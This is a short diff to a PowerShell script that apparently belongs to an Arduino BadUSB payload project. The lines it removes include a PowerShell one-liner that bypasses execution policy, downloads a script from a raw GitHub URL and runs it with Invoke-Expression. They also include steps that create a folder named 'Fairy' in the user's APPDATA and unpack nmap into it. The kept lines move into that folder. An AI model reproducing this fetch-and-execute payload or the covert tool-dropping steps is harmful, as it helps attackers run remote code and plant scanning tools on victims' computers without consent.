@@ -1,19 +1,4 @@
-# run this command on arduino
-# powershell Set-ExecutionPolicy Bypass -Scope Process -Force; $s = (Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/test.txt).Content ; Invoke-Expression -Command $s
-
-# create folder
-Write-Output "Creating Fairy"
-New-Item $env:APPDATA -Name "Fairy" -ItemType "Directory" -Force
-Write-Output "Created Fairy"
-
-# change directory into Fairy to download and unzip file
-
-# extract nmap
-Write-Output "Extracting File"
-Expand-Archive -LiteralPath ".\nmap.zip" -DestinationPath "$($env:APPDATA)\Fairy" -Force
-Write-Output "File Extracted"
-
-# change directory into executables folder
+# change directory into nmap folder
 Write-Output "Changing Directory"
 Set-Location -Path "$($env:APPDATA)\Fairy\nmap"
 Write-Output "Directory Changed"
